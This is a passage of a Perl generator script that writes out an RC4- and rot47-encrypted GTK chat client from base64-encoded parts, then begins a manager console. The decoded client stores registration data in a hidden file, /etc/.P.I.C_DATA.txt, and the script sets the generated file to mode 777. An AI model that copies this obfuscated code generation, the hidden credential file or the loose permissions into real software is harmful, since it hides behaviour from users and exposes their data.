lZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6IFxuJCFcbiIpOwpteSAkZW5jb2RlZDAgPSByb3Q0NygiJG1zZ19zZW5kIik7Cm15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKJHNlbmRfc29jay0+c2VuZCgkZW5jUkM0KSBvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInNlbmQ6ICQhXG4iKTsgCkd0azItPm1haW4oKTs=
";

my $part4 = "
c3ViIE1haW5Cb3ggeyBteSAkdmJveCA9IEd0azI6OlZCb3gtPm5ldygwLDApOwoKbXkgJG1haW5ib3ggPSBHdGsyOjpIQm94LT5uZXcoKTsKbXkgJGJ0bl9xdWl0ID0gR3RrMjo6QnV0dG9uLT5uZXdfZnJvbV9zdG9jaygnZ3RrLXF1aXQnKTsKJGJ0bl9xdWl0LT5zaWduYWxfY29ubmVjdCgiY2xpY2tlZCIgPT5zdWIgewpteSAkc2VuZF9zb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90byxQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwKUGVlckFkZHIgID0+ICRzZXJ2ZXJfaG9zdClvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIkNyZWF0aW5nIHNvY2tldDogXG4kIVxuIik7Cm15ICRlbmNvZGVkMCA9IHJvdDQ3KCJsb2dfb2YiLiRKLiJtZSIpOwpteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzZW5kX3NvY2stPnNlbmQoJGVuY1JDNCkgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJzZW5kOiAkIVxuIik7IApleGl0Owp9KTsKbXkgJGJ0bl9hYm91dCA9IEd0azI6OkJ1dHRvbi0+bmV3X2Zyb21fc3RvY2soJ2d0ay1hYm91dCcpOwokYnRuX2Fib3V0LT5zaWduYWxfY29ubmVjdCgiY2xpY2tlZCIgPT5zdWIge0Fib3V0KCk7fSk7Cm15ICRidG5fcXVpY2tfcmVnID0gR3RrMjo6QnV0dG9uLT5uZXdfZnJvbV9zdG9jaygnUmVnaXN0ZXInKTsKJGJ0bl9xdWlja19yZWctPnNpZ25hbF9jb25uZWN0KCJjbGlja2VkIiA9PnN1YiB7CiRtc2dfc2VuZCA9ICRlbnRfc2VuZC0+Z2V0X3RleHQ7CiRlbnRfc2VuZC0+c2V0X3RleHQoIiIpOwokZW50X3NlbmQtPmdyYWJfZm9jdXM7Cm15ICRtc2dfc2VuZF9hbGwgPSAicmVnOiIuJG1zZ19zZW5kOwppZiAoJG1zZ19zZW5kX2FsbCAhfiBtL15ccyokLyl7Cm15ICRzb2NrX3JlZyA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sUGVlclBvcnQgID0+ICRTRU5EX1BPUlQsIFBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6IFxuJCFcbiIpOwpteSAkZW5jb2RlZDAgPSByb3Q0NygiJG1zZ19zZW5kX2FsbCIpOyBteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzb2NrX3JlZy0+c2VuZCgkZW5jUkM0KSBvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInNlbmQ6ICQhIik7Cn19KTsgCgpteSAkYnRuX3F1aWNrX2xvZ2luID0gR3RrMjo6QnV0dG9uLT5uZXdfZnJvbV9zdG9jaygnTG9naW4nKTsKJGJ0bl9xdWlja19sb2dpbi0+c2lnbmFsX2Nvbm5lY3QoImNsaWNrZWQiID0+c3ViIHsKJG1zZ19zZW5kID0gJGVudF9zZW5kLT5nZXRfdGV4dDsKJGVudF9zZW5kLT5zZXRfdGV4dCgiIik7CiRlbnRfc2VuZC0+Z3JhYl9mb2N1czsKbXkgJG1zZ19zZW5kX2FsbCA9ICJhdXRoJEoiLiRtc2dfc2VuZDsKaWYgKCRtc2dfc2VuZF9hbGwgIX4gbS9eXHMqJC8pewpteSAkc29ja19yZWcgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUHJvdG8gPT4gJHByb3RvLFBlZXJQb3J0ICA9PiAkU0VORF9QT1JULCBQZWVyQWRkciAgPT4gJHNlcnZlcl9ob3N0KW9yICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAiQ3JlYXRpbmcgc29ja2V0OiBcbiQhXG4iKTsKbXkgJGVuY29kZWQwID0gcm90NDcoIiRtc2dfc2VuZF9hbGwiKTsgbXkgJGVuY1JDNCA9IFJDNCggJHBhc3MsICRlbmNvZGVkMCApOwokc29ja19yZWctPnNlbmQoJGVuY1JDNCkgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJzZW5kOiAkISIpOwp9fSk7CgpteSAkYnRuX3F1aWNrX3JlZl9wcml2ID0gR3RrMjo6QnV0dG9uLT5uZXdfZnJvbV9zdG9jaygiQ2xlYXIgUHJpdmF0ZVxuQ2hhdCBXaW5kb3ciKTsKJGJ0bl9xdWlja19yZWZfcHJpdi0+c2lnbmFsX2Nvbm5lY3QoImNsaWNrZWQiID0+c3ViIHsKbXkgJGNsZWFyYnVmZmVyID0gJE5ld1RWaWV3Mi0+Z2V0X2J1ZmZlcjsKJGNsZWFyYnVmZmVyLT5kZWxldGUoJGNsZWFyYnVmZmVyLT5nZXRfc3RhcnRfaXRlciwgJGNsZWFyYnVmZmVyLT5nZXRfZW5kX2l0ZXIpOwokTmV3VFZpZXcyLT5zZXRfYnVmZmVyKCRjbGVhcmJ1ZmZlcik7Cn0pOwoKbXkgJGJ0bl9xdWlja19yZWZfcHViID0gR3RrMjo6QnV0dG9uLT5uZXdfZnJvbV9zdG9jaygiQ2xlYXIgUHVibGljXG5DaGF0IFdpbmRvdyIpOwokYnRuX3F1aWNrX3JlZl9wdWItPnNpZ25hbF9jb25uZWN0KCJjbGlja2VkIiA9PnN1YiB7Cm15ICRjbGVhcmJ1ZmZlciA9ICR0dmlldy0+Z2V0X2J1ZmZlcjsKJGNsZWFyYnVmZmVyLT5kZWxldGUoJGNsZWFyYnVmZmVyLT5nZXRfc3RhcnRfaXRlciwgJGNsZWFyYnVmZmVyLT5nZXRfZW5kX2l0ZXIpOwokdHZpZXctPnNldF9idWZmZXIoJGNsZWFyYnVmZmVyKTsKfSk7CgpteSAkbGJsX2NvbG9yID0gR3RrMjo6TGFiZWwtPm5ldygpOyAKbXkgJGZyYW1lID0gR3RrMjo6RnJhbWUtPm5ldygiUHVibGljIENoYXQgV2luZG93Iik7CiRmcmFtZS0+c2V0X2JvcmRlcl93aWR0aCg1KTsKbXkgJHN3ID0gR3RrMjo6U2Nyb2xsZWRXaW5kb3ctPm5ldyAodW5kZWYsIHVuZGVmKTsKJHN3LT5zZXRfc2hhZG93X3R5cGUgKCdldGNoZWQtb3V0Jyk7CiRzdy0+c2V0X3BvbGljeSAoJ2F1dG9tYXRpYycsICdhdXRvbWF0aWMnKTsKJHN3LT5zZXRfc2l6ZV9yZXF1ZXN0ICg2MDAsIDIwMCk7CiRzdy0+c2V0X2JvcmRlcl93aWR0aCg1KTsKCiR0dmlldy0+c2V0X2VkaXRhYmxlKDApOwokdHZpZXctPnNldF9jdXJzb3JfdmlzaWJsZSAoMCk7Cm15ICRidWZmZXIgPSAkdHZpZXctPmdldF9idWZmZXIoKTsKJGJ1ZmZlci0+Y3JlYXRlX21hcmsgKCdlbmQnLCAkYnVmZmVyLT5nZXRfZW5kX2l0ZXIsIDApOwokYnVmZmVyLT5zaWduYWxfY29ubmVjdCAoaW5zZXJ0X3RleHQgPT4gc3ViIHsKJHR2aWV3LT5zY3JvbGxfdG9fbWFyayAoJGJ1ZmZlci0+Z2V0X21hcmsgKCdlbmQnKSwgMC4wLCAxLCAwLCAwLjUpO30pOwokYnVmZmVyLT5jcmVhdGVfdGFnICgibXJYIixmb3JlZ3JvdW5kID0+ICJyZWQiLCk7CQokYnVmZmVyLT5jcmVhdGVfdGFnICgibXJaIixmb3JlZ3JvdW5kID0+ICJibHVlIiwpOwoKbXkgJGZyYW1lMiA9IEd0azI6OkZyYW1lLT5uZXcoIlByaXZhdGUgQ2hhdCBXaW5kb3ciKTsKJGZyYW1lMi0+c2V0X2JvcmRlcl93aWR0aCg1KTsKJE5ld1N3MiA9IEd0azI6OlNjcm9sbGVkV2luZG93LT5uZXcgKHVuZGVmLCB1bmRlZik7CiROZXdTdzItPnNldF9zaGFkb3dfdHlwZSAoJ2V0Y2hlZC1vdXQnKTsKJE5ld1N3Mi0+c2V0X3BvbGljeSAoJ2F1dG9tYXRpYycsICdhdXRvbWF0aWMnKTsKJE5ld1N3Mi0+c2V0X3NpemVfcmVxdWVzdCAoNjAwLCAyMDApOwokTmV3U3cyLT5zZXRfYm9yZGVyX3dpZHRoKDUpOwoKJE5ld1RWaWV3Mi0+c2V0X2VkaXRhYmxlKDApOwokTmV3VFZpZXcyLT5zZXRfY3Vyc29yX3Zpc2libGUgKDApOwoKJE5ld0J1ZmZvcjItPmNyZWF0ZV9tYXJrICgnZW5kJywgJE5ld0J1ZmZvcjItPmdldF9lbmRfaXRlciwgMCk7CiROZXdCdWZmb3IyLT5zaWduYWxfY29ubmVjdCAoaW5zZXJ0X3RleHQgPT4gc3ViIHsKJE5ld1RWaWV3Mi0+c2Nyb2xsX3RvX21hcmsgKCROZXdCdWZmb3IyLT5nZXRfbWFyayAoJ2VuZCcpLCAwLjAsIDEsIDAsIDAuNSk7fSk7CiROZXdCdWZmb3IyLT5jcmVhdGVfdGFnICgibXJYIixmb3JlZ3JvdW5kID0+ICJyZWQiLCk7CQokTmV3QnVmZm9yMi0+Y3JlYXRlX3RhZyAoIm1yWiIsZm9yZWdyb3VuZCA9PiAiYmx1ZSIsKTsKCgpteSAkc3dpbmQgPSBHdGsyOjpTY3JvbGxlZFdpbmRvdy0+bmV3ICh1bmRlZiwgdW5kZWYpOwokc3dpbmQtPnNldF9zaGFkb3dfdHlwZSAoJ2V0Y2hlZC1vdXQnKTsKJHN3aW5kLT5zZXRfcG9saWN5ICgnYXV0b21hdGljJywgJ2F1dG9tYXRpYycpOwokc3dpbmQtPnNldF9zaXplX3JlcXVlc3QgKDIwMCwgMTAwKTsKJHN3aW5kLT5zZXRfYm9yZGVyX3dpZHRoKDUpOwoKbXkgJGl0ZXIgPSAkdHJlZV9zdG9yZS0+YXBwZW5kKHVuZGVmKTsKJHRyZWVfc3RvcmUtPnNldCAoJGl0ZXIsMCA9PiAiVXNlcnMiKTsKJHRyZWVfY29sdW1uLT5zZXRfdGl0bGUgKCJTZWxlY3QgVXNlciB0byBUYWxrIik7Cm15ICRyZW5kZXJlciA9IEd0azI6OkNlbGxSZW5kZXJlclRleHQtPm5ldzsKJHRyZWVfY29sdW1uLT5wYWNrX3N0YXJ0ICgkcmVuZGVyZXIsIDApOwokdHJlZV9jb2x1bW4tPmFkZF9hdHRyaWJ1dGUoJHJlbmRlcmVyLCB0ZXh0ID0+IDApOwokdHJlZV92aWV3LT5hcHBlbmRfY29sdW1uICgkdHJlZV9jb2x1bW4pOwpteSAkdHJlZXNlbGVjdGlvbiA9ICR0cmVlX3ZpZXctPmdldF9zZWxlY3Rpb247CiAKbXkgJGJ0bl9zaG93X3VzZXJzID0gR3RrMjo6QnV0dG9uLT5uZXcoIl9VcGRhdGUgXG5Vc2VyIExpc3QhIik7CiRidG5fc2hvd191c2Vycy0+c2lnbmFsX2Nvbm5lY3QoImNsaWNrZWQiID0+IHN1YiB7Cm15ICRzb2NrMyA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sIFBlZXJQb3J0ICA9PiAkU0VORF9QT1JULCBQZWVyQWRkciAgPT4gJHNlcnZlcl9ob3N0KSA7Cm15ICRlbmNvZGVkMCA9IHJvdDQ3KCJ1U2VfUmxpU1QiLiRKLiJpd0FOdCIpOwpteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzb2NrMy0+c2VuZCgiJGVuY1JDNCIpOwoKJHRyZWVfc3RvcmUtPmNsZWFyICgpOwokaXRlciA9ICR0cmVlX3N0b3JlLT5hcHBlbmQodW5kZWYpOwokdHJlZV9zdG9yZS0+c2V0ICgkaXRlciwwID0+ICJVc2VycyIpOwoKbXkgJGludDsgbXkgQHVzZXJzVG90YWwgPSAgc3BsaXQoLyRKLywgJHhheGEpOwpmb3JlYWNoICgxLi4kbnVtYmVyX29mX3VzZXJzKXsKbXkgJGV4IC49ICAkdXNlcnNUb3RhbFskaW50KytdOwokaXRlcl9jaGlsZCA9ICR0cmVlX3N0b3JlLT5hcHBlbmQoJGl0ZXIpOwppZihpbmRleCgkZXgsICJvTjRuRHJVbm4xTiIpID4gMCl7Cm15ICRvbiA9IHN1YnN0cigkZXgsIDAsIC0xMSk7CiR0cmVlX3N0b3JlLT5zZXQgKCRpdGVyX2NoaWxkLDAgPT4kb24uIiBbK10iKTt9CmVsc2lmKGluZGV4KCRleCwgIjBmRl9MMW5FIikgPiAwKXsKbXkgJG9mZiA9IHN1YnN0cigkZXgsIDAsIC04KTsKJHRyZWVfc3RvcmUtPnNldCAoJGl0ZXJfY2hpbGQsMCA9PiRvZmYuIiBbLV0iKTsgfQp9fSk7CgoKbXkgJGZyYW0gPSBHdGsyOjpGcmFtZS0+bmV3KCk7IG15ICRzb21lQm94ID0gR3RrMjo6VkJveC0+bmV3KCk7ICRzb21lQm94LT5hZGQoJGJ0bl9zaG93X3VzZXJzKTsKJHNvbWVCb3gtPmFkZCgkYnRuX3F1aWNrX3JlZyk7ICRzb21lQm94LT5hZGQoJGJ0bl9xdWlja19sb2dpbik7ICRzb21lQm94LT5hZGQoJGJ0bl9hYm91dCk7ICRzb21lQm94LT5hZGQoJGJ0bl9xdWl0KTsKJHNvbWVCb3gtPmFkZCgkYnRuX3F1aWNrX3JlZl9wdWIpOyAkc29tZUJveC0+YWRkKCRidG5fcXVpY2tfcmVmX3ByaXYpOyAkTmV3U3cyLT5hZGQoJE5ld1RWaWV3Mik7ICRmcmFtZTItPmFkZCgkTmV3U3cyKTsgCm15ICRIQkJveCA9IEd0azI6OlZCb3gtPm5ldygwLDApOyAgJEhCQm94LT5hZGQoJGZyYW1lKTsgJEhCQm94LT5hZGQoJGZyYW1lMik7Cm15ICRmcmFtZV9leCA9IEd0azI6OkZyYW1lLT5uZXcoIlsgTWFpbiBFbnRyeSAtIHR5cGUgeW91ciBtZXNzYWdlIGZvciBldmVyeW9uZSBoZXJlIF0gfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn4gWyBQcml2YXRlIEVudHJ5IC0gbWVzc2FnZSBmb3Igc2VsZWN0ZWQgdXNlciBdIik7CiRzdy0+YWRkKCR0dmlldyk7JGZyYW1lLT5hZGQoJHN3KTsgJHN3aW5kLT5hZGQoJHRyZWVfdmlldyk7ICRmcmFtLT5hZGQoJHN3aW5kKTsgCiRtYWluYm94LT5wYWNrX3N0YXJ0KCRIQkJveCwxLDEsNCk7CiRtYWluYm94LT5wYWNrX3N0YXJ0KCRmcmFtLDEsMSw0KTsKJG1haW5ib3gtPmFkZCgkc29tZUJveCk7CiR2Ym94LT5wYWNrX3N0YXJ0KCRtYWluYm94LDEsMSw0KTsKbXkgJGhib3ggPSBHdGsyOjpIQm94LT5uZXcoMCw1KTsKJGhib3gtPnBhY2tfc3RhcnQoJGVudF9zZW5kLDEsMSwwKTsKJGhib3gtPnBhY2tfc3RhcnQoJHByaXZhdGVfZW50X3NlbmQsMSwxLDApOwoKJGVudF9zZW5kLT5zaWduYWxfY29ubmVjdCgna2V5X3ByZXNzX2V2ZW50Jz0+IHN1YiB7CglteSAoJHdpZGdldCwkZXZlbnQpID0gQF87CglpZigkZXZlbnQtPmtleXZhbCA9PSAkUmV0e1JldHVybn0pIHsKCW15ICRtc2dfc2VuZCA9ICRlbnRfc2VuZC0+Z2V0X3RleHQ7CgkkZW50X3NlbmQtPnNldF90ZXh0KCIiKTskZW50X3NlbmQtPmdyYWJfZm9jdXM7CglpZiAoJG1zZ19zZW5kICF+IG0vXlxzKiQvKXsKCW15ICRzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90byxQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwKCVBlZXJBZGRyICA9PiAkc2VydmVyX2hvc3Qpb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJDcmVhdGluZyBzb2NrZXQ6ICQhXG4iKTsKCW15ICRlbmNvZGVkMCA9IHJvdDQ3KCI8JHRhZ19zZW5kPiAkbXNnX3NlbmQiKTsKCW15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKCSRzb2NrLT5zZW5kKCRlbmNSQzQpIG9yICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAic2VuZDogJCFcbiIpOwoJJnVwZGF0ZV9idWZmZXIoJGJ1ZmZlciwkbXNnX3NlbmQsMSk7Cgl9CnJldHVybiAxO30KfSk7CgokcHJpdmF0ZV9lbnRfc2VuZC0+c2lnbmFsX2Nvbm5lY3QoJ2tleV9wcmVzc19ldmVudCc9PiBzdWIgewoJbXkgKCR3aWRnZXQsJGV2ZW50KSA9IEBfOwoJaWYoJGV2ZW50LT5rZXl2YWwgPT0gJFJldHtSZXR1cm59KSB7CgkJCW15ICR0cmVlc2VsZWN0aW9uID0gJHRyZWVfdmlldy0+Z2V0X3NlbGVjdGlvbjsKCQkJJHRyZWVzZWxlY3Rpb24tPnNlbGVjdGVkX2ZvcmVhY2ggKHN1YnsgCgkJCW15ICgkbW9kZWwsJHBhdGgsJGl0ZXIpID1AXzsKCQkJbXkgJHZhbHVlID0gJG1vZGVsLT5nZXQoJGl0ZXIsMCk7CiAJCQlteSAkbXNnX3NlbmQgPSAkcHJpdmF0ZV9lbnRfc2VuZC0+Z2V0X3RleHQ7CiAJCQkkcHJpdmF0ZV9lbnRfc2VuZC0+c2V0X3RleHQoIiIpOwogCQkJJHByaXZhdGVfZW50X3NlbmQtPmdyYWJfZm9jdXM7CiAJCQlpZiAoJG1zZ19zZW5kICF+IG0vXlxzKiQvKXsKCQkJbXkgJFJlYWR5VmFsdWUgPSBzdWJzdHIoJHZhbHVlLCAwLCAtNCk7CgkJCW15ICRzb2NrID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvID0+ICRwcm90byxQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwKCQkJUGVlckFkZHIgID0+ICRzZXJ2ZXJfaG9zdClvciAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIkNyZWF0aW5nIHNvY2tldDogJCFcbiIpOwoJCQlteSAkZW5jb2RlZDAgPSByb3Q0NygidG9fdXNlciRKJFJlYWR5VmFsdWUkSiR0YWdfc2VuZCRKJG1zZ19zZW5kIik7CgkJCW15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKCQkJJHNvY2stPnNlbmQoJGVuY1JDNCkgb3IgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJzZW5kOiAkIVxuIik7CiAJCQkmdXBkYXRlX2J1ZmZlcigkTmV3QnVmZm9yMiwkbXNnX3NlbmQsMSk7CQogCQkJfQogCQl9KTsKcmV0dXJuIDE7fQp9KTsKCiRmcmFtZV9leC0+YWRkKCRoYm94KTsJIAokdmJveC0+cGFja19zdGFydCgkZnJhbWVfZXgsMSwxLDQpOyR2Ym94LT5zZXRfZm9jdXNfY2hpbGQoJGhib3gpOyR2Ym94LT5zaG93X2FsbCgpOwpyZXR1cm4gJHZib3g7Cn0K
";

my $part5 = "
c3ViIHdhdGNoX2NhbGxiYWNrIHsKbXkgKCRmaCwkdHZpZXcpID0gQF87Cm15ICRtc2c7IGludCAkaTsKJGZoLT5yZWN2KCRtc2csICRNQVhMRU4pIG9yICRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAicmVjdjogJCFcbiIpOwpteSAkYnVmZmVyID0gJHR2aWV3LT5nZXRfYnVmZmVyKCk7Cm15ICROZXdCdWZmID0gJE5ld1RWaWV3Mi0+Z2V0X2J1ZmZlcigpOwpteSAkZGVjUkM0ID0gUkM0KCAkcGFzcywgJG1zZyApOwpteSAkZGVjb2RlZCA9IHJvdDQ3KCRkZWNSQzQpOwpteSBAd29yZHMgPSBzcGxpdCgvJEovLCAkZGVjb2RlZCk7CmlmKCRkZWNvZGVkIGVxICJhdXRoX25vdXNlciIpewokYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInlvdSBhcmUgbm90IHJlZ2lzdGVyZWQsIHBsZWFzZSByZWdpc3RlciB0byBiZSBhYmxlIHRvIHVzZSBvdXIgY2hhdCA6KVxuIik7Cn1lbHNpZigkZGVjb2RlZCBlcSAiYXV0aF9ub3RvayIpIHskYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgInVzZXJuYW1lIG9yIHBhc3N3b3JkIGluY29ycmVjdCwgcGxlYXNlIHRyeSBhZ2FpbiFcbiIpOwp9ZWxzaWYoJGRlY29kZWQgZXEgImF1dGhfb2siKXsgJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJMb2dnZWQgSW4hIFBsZWFzZSBoaXQgJ1VwZGF0ZSBVc2VycycgQnV0dG9uIHRvIHNlZSB1c2VyIGxpc3QgOylcbiIpOwp9ZWxzaWYoJGRlY29kZWQgZXEgInJlZ19vayIpeyAkYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIkxvZ2dlZCBJbiBhbmQgcmVnaXN0ZXJlZCEgUGxlYXNlIGhpdCAnVXBkYXRlIFVzZXJzJyBCdXR0b24gdG8gc2VlIHVzZXIgbGlzdCA7KVxuIik7Cm9wZW4gKEY1LCAiPj4vZXRjLy5QLkkuQ19EQVRBLnR4dCIpOyBwcmludCBGNSBjcnkoJG1zZ19zZW5kKTsgY2xvc2UgKEY1KTsKfWVsc2lmKCRkZWNvZGVkIGVxICJyZWdfbm90b2siKSB7JGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJBY2NvdW50IGFsbHJlYWR5IGluIHVzZSEgVHJ5IHNvbWV0aGluZyBkaWZmZXJlbnQuXG4iKTsKfWVsc2lmKCR3b3Jkc1swXSBlcSAidXNlcnMiKSB7CgkkbnVtYmVyX29mX3VzZXJzID0gJHdvcmRzWzFdOwoJJGJ1ZmZFeC0+aW5zZXJ0ICgkYnVmZkV4LT5nZXRfZW5kX2l0ZXIsICJOciBvZiB1c2VyczogJG51bWJlcl9vZl91c2Vyc1xuIik7Cglmb3JlYWNoKDEuLjIrJG51bWJlcl9vZl91c2Vycyl7CgkkdXNlcnNfY29udGFpbmVyIC49ICR3b3Jkc1skaSsrXTsKCSR1c2Vyc19jb250YWluZXIgLj0gIlxuIjsKCX0KCUB3b3JkID0gKCR1c2Vyc19jb250YWluZXIgPX4gLyhcdyspL2cpOwoJJHhheGEgPSAgam9pbiAiJEoiLCBAd29yZFsyLi4kbnVtYmVyX29mX3VzZXJzKzJdOwp9IGVsc2lmKCR3b3Jkc1swXSBlcSAibm90X2xvZ2dlZCIpIHsKCXByaW50ICJub3QgbG9nZ2VkIVxuIjsKCSRidWZmRXgtPmluc2VydCAoJGJ1ZmZFeC0+Z2V0X2VuZF9pdGVyLCAiWW91IGFyZSBub3QgbG9nZ2VkIHRvIHRoZSBzeXN0ZW0uIFBsZWFzZSBMb2cgaW4uXG4iKTsKfSBlbHNpZigkd29yZHNbMF0gZXEgImZyb21fdXNlciIpIHsKCQlteSAkU291cmNlVXNlciA9ICR3b3Jkc1sxXTsgbXkgJFNvdXJjZU1TRyA9ICR3b3Jkc1syXTsKCQlteSAkUmVhZHkgPSAiPCRTb3VyY2VVc2VyPiAkU291cmNlTVNHIjsKCQkmdXBkYXRlX2J1ZmZlcigkTmV3QnVmZiwkUmVhZHksMCk7Cn1lbHNpZigkd29yZHNbMF0gZXEgImJhbm5lZF91c2VyIikgewokYnVmZkV4LT5pbnNlcnQgKCRidWZmRXgtPmdldF9lbmRfaXRlciwgIllvdSBhcmUgYmFubmVkIVxuIik7Cn1lbHNlIHsKJnVwZGF0ZV9idWZmZXIoJGJ1ZmZlciwkZGVjb2RlZCwwKTsKfQpyZXR1cm4gMTsKfQoKc3ViIHVwZGF0ZV9idWZmZXIgewpwcmludCAkYnVmZmVyOwpteSAoJGJ1ZmZlciwkbXNnLCRzZW5kKT0gQF87CiRtc2cgPSAkbXNnLiJcbiI7CmlmICgkc2VuZCkgeyAKbXkgJGl0ZXIgPSAkYnVmZmVyLT5nZXRfZW5kX2l0ZXI7CiRidWZmZXItPmluc2VydF93aXRoX3RhZ3NfYnlfbmFtZSgkaXRlciwgIjwkdGFnX3NlbmQ+ICRtc2ciKTsKfWVsc2V7Cm15ICRpdGVyID0gJGJ1ZmZlci0+Z2V0X2VuZF9pdGVyOwokYnVmZmVyLT5pbnNlcnRfd2l0aF90YWdzX2J5X25hbWUoJGl0ZXIsICRtc2csJHRhZ19yZWNlaXZlKTsKfX0K
";

my $file1 = "client";
open(LOGFILE,">>$file1") or die("Cannot create file $file1!\n");
        print LOGFILE ("$part1");
	print LOGFILE (decry($part2));
	print LOGFILE (decry($part3));
	print LOGFILE (decry($part4));
	print LOGFILE (decry($part5));
        close(LOGFILE);
	system ("chmod 777 $file1");
}

sub GenerateManagerConsole {
my $part1 = "\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c
my \$pass = \"$RC4Key\"; 
my \$server_host = \"$ServerIP\"; 
my \$SEND_PORT = $ServerPort; 
my \$ERTEPort = $ClientPort; 
my \$J = \"$Splitter\"; # splitter
";

my $part2 = "
CnBhY2thZ2UgR3RrMjo6SGVscGVyOwp1c2UgR2xpYjsKdXNlIERCSTsKdXNlIElPOjpTb2NrZXQ7CgpzdWIgYWRkX3dhdGNoIHtzaGlmdDsgbXkgKCRmZCwgJGNvbmQsICRjYWxsYmFjaywgJGRhdGEpID0gQF87CiRjb25kID0gJGNvbmQgZXEgJ2luJyAgPyAnR19JT19JTicgIDogJGNvbmQgZXEgJ291dCcgPyAnR19JT19PVVQnIDoKcHJpbnQgIkludmFsaWQgY29uZGl0aW9uIGZsYWcuIEV4cGVjdGluZzogJ2luJyAvICdvdXQnIjsKbXkgJHRhZyA9IHsgaW9faWQgID0+IEdsaWI6OklPLT5hZGRfd2F0Y2ggKCRmZCwgJGNvbmQsICRjYWxsYmFjaywgJGRhdGEpLApodXBfaWQgPT4gR2xpYjo6SU8tPmFkZF93YXRjaCAoJGZkLCAnR19JT19IVVAnLCAkY2FsbGJhY2ssICRkYXRhKSx9OwpyZXR1cm4gJHRhZzsKfQoKdXNlIEd0azIgLWluaXQ7Cm15ICVSZXRrZXkgPSAoJ1JldHVybicgPT4gMHhmZjBkKTsKc3ViIHJvdDQ3IHtteSAoJHN0cik9QF87JHN0ciA9fiB0ci8hLX4vUC1+IS1PLztyZXR1cm4gJHN0cjt9CgpteSAkTUFYX0NIVU5LX1NJWkU7CiRNQVhfQ0hVTktfU0laRSA9IDEwMjQgdW5sZXNzICRNQVhfQ0hVTktfU0laRTsKc3ViIG5ldyB7bXkgKCAkY2xhc3MsICRrZXkgKSAgPSBAXztteSAkc2VsZiA9IGJsZXNzIHt9LCAkY2xhc3M7JHNlbGYtPntzdGF0ZX0gPSBTZXR1cCggJGtleSApOwokc2VsZi0+e3h9ID0gMDskc2VsZi0+e3l9ID0gMDskc2VsZjt9CnN1YiBSQzQge215ICRzZWxmO215KCBAc3RhdGUsICR4LCAkeSApO2lmICggcmVmICRfWzBdICkgeyRzZWxmID0gc2hpZnQ7QHN0YXRlID0gQHsgJHNlbGYtPntzdGF0ZX0gfTsKJHggPSAkc2VsZi0+e3h9OyR5ID0gJHNlbGYtPnt5fTt9IGVsc2Uge0BzdGF0ZSA9IFNldHVwKCBzaGlmdCApOyR4ID0gJHkgPSAwO30KbXkgJG1lc3NhZ2UgPSBzaGlmdDtteSAkbnVtX3BpZWNlcyA9IGRvIHtteSAkbnVtID0gbGVuZ3RoKCRtZXNzYWdlKSAvICRNQVhfQ0hVTktfU0laRTsKbXkgJGludCA9IGludCAkbnVtOyRpbnQgPT0gJG51bSA/ICRpbnQgOiAkaW50KzE7fTtmb3IgbXkgJHBpZWNlICggMC4uJG51bV9waWVjZXMgLSAxICkgewpteSBAbWVzc2FnZSA9IHVucGFjayAiQyoiLCBzdWJzdHIoJG1lc3NhZ2UsICRwaWVjZSAqICRNQVhfQ0hVTktfU0laRSwgJE1BWF9DSFVOS19TSVpFKTsKZm9yICggQG1lc3NhZ2